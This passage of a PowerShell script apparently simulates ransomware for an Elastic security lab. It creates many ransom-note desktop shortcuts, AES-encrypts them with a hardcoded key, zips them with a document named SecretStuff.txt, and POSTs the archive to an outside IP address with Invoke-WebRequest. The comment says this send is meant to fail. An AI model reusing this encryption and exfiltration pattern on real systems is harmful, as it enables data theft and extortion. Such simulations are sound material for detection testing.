$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom53.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom54.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom55.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom56.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom57.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom58.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom59.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom60.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom61.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom62.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom63.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom64.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom65.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom66.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom67.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom68.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

$TargetFile = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/online-ransom-note-demanding-payment.png"
$shortcutFile = "C:\Users\Elastic\Desktop\Ransom69.lnk"
$WScriptShell = New-Object -ComObject WScript.Shell
$shortcut = $WScriptShell.CreateShortcut($ShortcutFile)
$shortcut.TargetPath = $TargetFile
$shortcut.IconLocation = "https://raw.githubusercontent.com/H0wl3r/Elastic_Lab/main/Pictures/1486564389-lock-red_81516.ico"
$shortcut.Save()

Start-Sleep -S 5

# Encrypt files
Write-Host "[+] Encrypting Files" -ForegroundColor Green
Install-Module -Name DRTools -Force
$key = "SWxvdmVyYW5zb213YXJlPDM="
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom1.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom2.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom3.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom4.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom5.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom6.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom7.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom8.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom9.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom10.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom11.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom12.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom13.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom14.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom15.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom16.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom17.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom18.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom19.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom20.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom21.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom22.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom23.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom24.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom25.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom26.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom27.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom28.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom29.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom30.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom31.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom32.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom33.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom34.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom35.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom36.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom37.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom38.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom39.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom40.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom41.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom42.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom43.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom44.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom45.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom46.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom47.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom48.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom49.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom50.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom51.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom52.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom53.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom54.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom55.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom56.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom57.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom58.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom59.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom60.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom61.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom62.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom63.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom64.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom65.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom66.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom67.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom68.lnk
Invoke-AESEncryption -Mode Encrypt -Key $key -Path C:\Users\Elastic\Desktop\Ransom69.lnk

Start-Sleep -S 15

Write-Host "[+] Preparing Files" -ForegroundColor Green
$files = "C:\Users\Elastic\Desktop\Ransom.lnk", "C:\Users\Elastic\Desktop\Ransom1.lnk", "C:\Users\Elastic\Desktop\Ransom2.lnk", "C:\Users\Elastic\Desktop\Ransom3.lnk", "C:\Users\Elastic\Desktop\Ransom4.lnk", "C:\Users\Elastic\Desktop\Ransom6.lnk", "C:\Users\Elastic\Desktop\Ransom7.lnk", "C:\Users\Elastic\Desktop\Ransom8.lnk", "C:\Users\Elastic\Desktop\Ransom9.lnk", "C:\Users\Elastic\Documents\SecretStuff.txt"
Compress-Archive -LiteralPath $files -DestinationPath C:\temp\Ransom_Data.zip

Write-Host "[+] Exfiltrating Data" -ForegroundColor Green
# Exfil will fail due to IP address
$content1 = Get-Content C:\temp\Ransom_Data.zip
Invoke-WebRequest -Uri 172.31.33.46 -Method POST -Body $content1


Start-Sleep -S 15


